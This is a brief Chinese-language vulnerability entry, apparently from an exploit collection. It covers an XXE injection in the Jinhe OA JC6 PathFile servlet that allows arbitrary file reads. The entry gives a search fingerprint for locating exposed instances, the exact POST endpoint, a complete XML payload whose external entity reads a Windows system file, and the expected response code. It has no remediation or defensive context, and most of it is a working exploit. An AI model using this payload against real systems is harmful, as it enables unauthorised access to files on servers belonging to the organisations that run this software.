# 金和JC6PathFileXML实体注入致任意文件读取漏洞

金和OA ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="金和网络-金和OA"`
- **请求**：`POST /jc6/servlet/PathFile?GetUrl HTTP/1.1`

**Payload**
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
<root>
<path>&xxe;</path>
<strType>file</strType>
<IsVir>no</IsVir>
<displayType>list</displayType>
<strFiles>*.*</strFiles>
</root>
```
- **响应特征**：200